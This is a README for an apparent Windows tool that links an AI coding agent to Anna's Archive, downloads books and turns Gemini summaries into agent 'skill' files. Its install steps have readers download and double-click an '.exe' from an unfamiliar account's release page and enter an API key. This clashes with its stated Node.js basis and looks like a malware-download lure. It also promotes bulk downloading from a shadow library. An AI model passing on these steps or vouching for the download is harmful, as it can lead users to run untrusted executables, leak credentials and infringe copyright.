# 📚 mcp-annas-archive-create-skill - Search and extract professional research notes

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Earnest-clockworkuniverse497/mcp-annas-archive-create-skill/releases)

This application bridge allows you to connect your research assistant to Anna's Archive. It searches for books and research documents, extracts the core methodology, and saves the information into a structured file format. You can use these files directly within Claude Code to improve your results.

## 🛠 What this tool does

This software acts as a helper for your artificial intelligence agent. It manages the connection between the internet archive and your document drafting process. It performs the following tasks:

1. Searches Anna’s Archive for relevant books based on your keywords.
2. Downloads files like PDF or EPUB documents.
3. Uses the Google Gemini model to analyze the text.
4. Identifies the methodology used in the document.
5. Saves this information into a skill file that your agent understands.

## 💻 System requirements

To run this tool on your Windows computer, you need the following items:

* A computer running Windows 10 or Windows 11.
* A stable internet connection.
* A Google AI Studio API key.
* The Node.js runtime environment installed on your system.

## 🚀 Downloading the software

You need to obtain the installer from the official release page. This page contains the most recent updates and stability fixes for the application.

1. Go to the [official release page](https://github.com/Earnest-clockworkuniverse497/mcp-annas-archive-create-skill/releases).
2. Look for the section labeled "Assets" at the bottom of the latest release.
3. Click the file ending in `.exe` to start the download.
4. Save the file to a folder on your desktop so you can find it easily.

## ⚙️ Setting up your environment

Before you can use the tool, you must install Node.js. This program allows the library to talk to your computer's hardware.

1. Navigate to the official Node.js website.
2. Select the version labeled "LTS" (Long Term Support).
3. Download the installer for Windows.
4. Open the file you downloaded and follow the prompts. Keep the default settings during the installation.
5. Restart your computer after the installation finishes.

## 🔑 Preparing your API key

The software needs a secret key to communicate with Google Gemini. This service processes the documents you find.

1. Sign into your Google AI Studio account.
2. Click the button to create a new API key.
3. Copy the long string of letters and numbers.
4. Save this string in a private document on your computer. You will need it in the next step.

## 📁 Running the application

Once you have the software and your API key, you can start the process.

1. Locate the `.exe` file you downloaded earlier.
2. Double-click the file to open the interface.
3. The program will open a terminal window. This window shows the status of your searches.
4. Type your search query when the program asks for a topic.
5. Enter your API key when prompted. You only need to do this once.
6. Press the Enter key on your keyboard to begin the retrieval process.

## 📄 Managing your skill files

The tool creates files with the extension `.md`. These are text files that contain the research notes the computer generates. You can open these files with Notepad or any other text editor.

The files follow a strict format. This format ensures that your agent can read them without errors. You should see three distinct sections in each file:

* Summary: A brief overview of the book's content.
* Methodology: The core steps or theories discovered in the document.
* Reliability: A score based on the source quality.

Do not change the structure of these files if you plan to use them with an AI agent. The agent relies on these headers to understand the document structure.

## 🔍 Troubleshooting common issues

If the software does not work, check these common points of failure:

* Check your internet connection. Search requests fail if the computer cannot reach the website.
* Verify your API key. If the key is invalid, the Gemini model will return an error message in the terminal.
* Ensure you installed the correct version of Node.js. Older versions may lack the features required to run this script.
* Clear the cache folder if the application stops responding. You can find this folder in the same directory as the executable file.

## 🛡 Security and privacy

This tool runs locally on your computer. It does not send your personal browsing history to any external servers. The only data sent over the internet is your search query and the text of the documents you choose to analyze. Your API key remains on your local machine and does not provide access to your private files.

## 📈 Improving results

To get the best outcome from your search, use specific keywords. Instead of searching for "physics," search for "quantum mechanics methodology in laboratory testing." The Gemini engine works best when it has a clear focus. If the engine reports that it cannot find relevant information, try a different book from the search results list.

## 🖇 Frequently asked questions

Do I need to pay for this software?
No, the software is free to use. You only need a valid API key from Google, which has a free tier for individual users.

Can I run this on a tablet?
The current version only supports Windows computers. It does not work on mobile operating systems like Android or iOS.

How do I update the software?
Visit the release page again whenever you want to check for a newer version. Download the new installer and overwrite the old file.

What should I do if the terminal closes immediately?
Open the file by dragging it into a command prompt window. This keeps the window open so you can read the error message for better troubleshooting.